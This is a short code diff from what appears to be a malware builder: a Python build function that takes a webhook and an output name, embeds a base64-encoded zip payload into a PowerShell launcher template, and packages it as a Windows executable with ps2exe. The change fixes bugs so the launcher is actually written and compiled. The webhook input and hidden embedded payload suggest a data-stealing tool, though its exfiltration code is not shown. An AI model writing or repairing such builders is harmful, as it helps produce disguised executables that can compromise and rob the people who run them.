@@ -44,12 +44,12 @@ def build(webhook: str, output: str):
     print(f"{'-'*30} Configure launcher... {'-'*30}")
     print(f"[{Fore.CYAN}*{Fore.RESET}] Setup launcher...")
     with open("core/template/launcher.tm", "r") as f:
-        template = f.read().replace(r"%b64zip%", zipbase64.decode())
-        template = template.replace(r"%exec%", output+".exe")
+        template = f.read().replace(r"%b64zip%", '"'+zipbase64.decode()+'"')
+        template = template.replace(r"%exec%", '"'+output+".exe"+'"')
     
     print(f"[{Fore.GREEN}${Fore.RESET}] Writing launcher...")
     with open(output+".ps1", "w") as f:
-        f.write(output+".ps1")
+        f.write(template)
     
     print(f"[{Fore.CYAN}*{Fore.RESET}] Converting to exe...")
     subprocess.run(["powershell", "-Command", fr"Invoke-ps2exe .\{output}.ps1 .\{output}.exe"], capture_output=True)
